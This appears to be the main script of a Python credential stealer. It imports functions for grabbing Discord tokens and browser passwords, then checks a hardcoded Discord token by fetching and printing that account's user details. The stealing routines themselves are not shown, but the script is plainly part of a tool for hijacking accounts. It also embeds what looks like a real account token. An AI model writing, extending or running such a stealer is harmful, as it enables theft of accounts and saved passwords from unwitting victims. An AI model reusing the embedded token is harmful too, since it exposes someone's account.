from target.discord import GetDiscordTokens
from target.browsers import GetBrowsersPasswords
from hardware.Hardware import Hardware

from checks.discord import Discord

from utils.paths import GetAppDataPaths

if __name__ == '__main__':
    discord = Discord("Nzk1Nzg1MjI5Njk5NjQ1NDkx.GC9J6h.V45EYtOF8eYvUd_JgKqqNQZpW_GzUCl4eFL6xo")
    user = discord.GetUser()
    print(user)